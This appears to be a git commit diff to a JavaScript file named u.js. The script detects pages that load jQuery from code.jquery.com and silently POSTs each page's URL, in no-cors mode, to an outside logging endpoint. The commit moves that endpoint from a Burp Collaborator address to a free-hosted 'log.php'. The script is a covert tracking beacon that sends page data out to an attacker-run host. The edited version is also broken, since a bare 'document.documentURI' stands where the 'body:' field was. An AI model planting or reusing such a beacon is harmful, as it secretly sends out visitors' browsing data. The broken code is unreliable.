83e2d21fcdd7167079a3e0072bf57785f06ea3e9
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-03 02:37:13 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,8 +1,8 @@
-window.onload=()=>{var reg=/code\.jquery.com/ig;
+var reg=/code\.jquery.com/ig;
 if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
-fetch('https://qa4b5aap1x3ws679kfbgn0kytpzfn4.burpcollaborator.net', {
+fetch('https://lordwd.000webhostapp.com/log.php', {
 method: 'POST',
 mode: 'no-cors',
-body:document.documentURI
+document.documentURI
 });
-}}
+}
